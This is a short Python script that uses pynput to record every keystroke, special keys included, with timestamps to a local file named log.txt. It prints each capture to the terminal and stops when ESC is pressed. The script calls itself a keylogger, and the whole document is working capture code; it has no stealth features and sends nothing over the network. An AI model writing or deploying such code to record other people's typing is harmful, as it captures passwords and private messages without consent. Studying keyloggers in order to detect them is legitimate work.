from pynput.keyboard import Key, Listener # pyright: ignore[reportMissingModuleSource]
import logging

# Setup logging
logging.basicConfig(filename=("log.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # This will show you in the terminal that it's working!
        print(f"Captured: {key.char}") 
        logging.info(f"Key: {key.char}")
    except AttributeError:
        print(f"Captured Special: {key}")
        logging.info(f"Special Key: {key}")

def on_release(key):
    if key == Key.esc:
        print("Stopping script...")
        return False

# Start listening
print("Keylogger is running... Press ESC to stop and save.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()